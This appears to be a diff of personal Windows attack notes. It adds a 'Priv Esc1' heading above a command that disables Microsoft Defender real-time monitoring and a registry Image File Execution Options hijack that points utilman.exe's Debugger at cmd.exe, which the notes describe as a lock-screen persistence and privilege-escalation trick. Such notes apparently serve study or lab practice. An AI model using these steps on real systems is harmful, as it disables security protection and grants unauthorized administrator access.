@@ -87,12 +87,17 @@ reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme
 Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
   ### shows all the users who logged in
 
-
+Priv Esc1:
 Set-MpPreference -DisableRealtimeMonitoring $TRUE     ### do this first to allow this 
 Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
   ###new key 'utilman.exe'; stringvalue 'Debugger', modify valuedata: C:\Windows\System32\cmd.exe 
                                   ###means of persistence, inheretis users priv, useful for priv esc,  ->.ie lock the screen then open ease of use
-                                                                                                              
+
+
+
+
+
+
 
 
 
